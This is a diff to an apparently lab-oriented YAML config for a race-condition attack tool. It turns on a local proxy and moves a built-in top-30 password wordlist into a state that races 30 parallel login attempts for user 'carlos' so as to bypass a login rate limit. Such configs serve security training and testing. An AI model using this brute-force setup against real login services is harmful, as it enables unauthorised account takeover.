@@ -35,18 +35,15 @@ target:
     verify_cert: false
   http:
     follow_redirects: false
-  # proxy:
-  #   type: http
-  #   host: 127.0.0.1
-  #   port: 8080
+  proxy:
+    type: http
+    host: 127.0.0.1
+    port: 8080
 
 entrypoint:
   state: login_page
   input:
     username: "carlos"
-    password:
-      source: file
-      path: "builtin:passwords-top-30"
 
 # ============================================================================
 # STATES
@@ -86,7 +83,7 @@ states:
     description: "Bypass rate limit by racing login attempts with different passwords"
     
     # This state demonstrates the key feature: input_mode: distribute
-    # Each of the 50 threads will receive a DIFFERENT password from the wordlist
+    # Each of the 30 threads will receive a DIFFERENT password from the wordlist
     race:
       threads: 30
       input_mode: distribute  # Each thread gets a unique password
@@ -96,7 +93,13 @@ states:
 
     # options:
     #   proxy_bypass: true
-    
+
+    # Input configuration for username and password
+    input:
+      password:
+        source: file
+        path: "builtin:passwords-top-30" # Built-in wordlist with common passwords
+
     request: |
       POST /login HTTP/1.1
       Host: {{ target.host }}
